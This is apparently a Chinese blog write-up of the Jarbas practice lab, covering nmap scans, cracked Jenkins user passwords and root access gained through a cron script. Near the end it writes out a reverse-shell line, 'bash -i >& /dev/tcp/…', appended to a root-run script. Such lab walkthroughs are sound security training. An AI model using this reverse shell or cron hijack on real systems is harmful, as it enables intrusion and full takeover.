---
icon: pen-to-square
date: 2025-07-14
tags: 
title: Jarbas
category:
  - 项目
---
## 前言
可恶的virtualbox靶场，让我踩了一堆坑
1. virtualbox必须关闭Hyper-V，让我直接没办法用wsl-kali,因此还去特意下了一个kali，最开始想试一下hyper-V版本，但是根本没法运行bat，果断放弃换用VMware，少折腾，放心。
2. virtualbox的NAT不会产生虚拟网卡，而是在主机创建一个virtualbox路由，让我没办法直连虚拟机，后来换用仅主机模式才直连上
## 信息收集
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.56.102 -oA nmapscan/ports 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 13:34 EDT
Nmap scan report for 192.168.56.102
Host is up (0.025s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
110/tcp  open  pop3
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 18.85 seconds
```

### 详细信息扫描
```bash
──(kali㉿kali)-[~]
└─$ sudo nmap -sT -sV -sC -O -p22,25,110,3306,8080  192.168.56.102 -oA nmapscan/detail
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 13:57 EDT
Nmap scan report for 192.168.56.102
Host is up (0.00058s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)
|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)
|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)
25/tcp   open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
110/tcp  open  tcpwrapped
3306/tcp open  mysql      MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose
Running: Actiontec embedded, Linux 2.4.X
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37
OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.64 seconds
```

## 渗透过程
搜索框架Jenkins发现超多漏洞利用，随便用一个看看

 ![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250714023553.png)
只有一个文件读取可以用，可惜只能读取一行内容，没什么帮助

目光回到web，进入默认web页（80）这个端口似乎没扫描出来
爆破一下，发现
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250715082826.png)
```bash
tiago:5978a63b4654c73c60fa24f836386d87  
trindade:f463f63616cb3f1e81ce46b39f882fd5  
eder:9b38e2b1e8b12f426b0d208a7ab6cb98
```
用identifier识别一下哈希类型
[[w1r3s#**小技巧**--hash类型识别|hash识别]]
均为MD5
用在线工具解密
```bash
tiago:italia99
trindade:marianna
eder:vipsu
```
尝试在80端口登录
登陆成功，然后进行项目构建，在构建过程中执行反弹shell命令
tips：这里因为仅主机连接，所以又开了frp隧道，才连接上kali攻击机

经过一系列提权尝试，都没有成功，以下是可行方案
### Crontab定时任务提权
```bash
cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
```
每五分钟执行一次`/etc/script/CleaningScript.sh`命令，查看一下
```bash
cat /etc/script/CleaningScript.sh
#!/bin/bash

rm -rf /var/log/httpd/access_log.txt
```
追加一条
```bash
echo "bash -i >& /dev/tcp/192.168.56.1/8883 0>&1" >> /etc/script/CleaningScript.sh
```
攻击机监听8883获得root权限shell

## 总结
1. 走了点弯路，学会了内网攻击机，与其他网段内网机器的通讯的方法，就是frp隧道
2. msfconsole不是万能的
3. 内网理论更新--定时任务

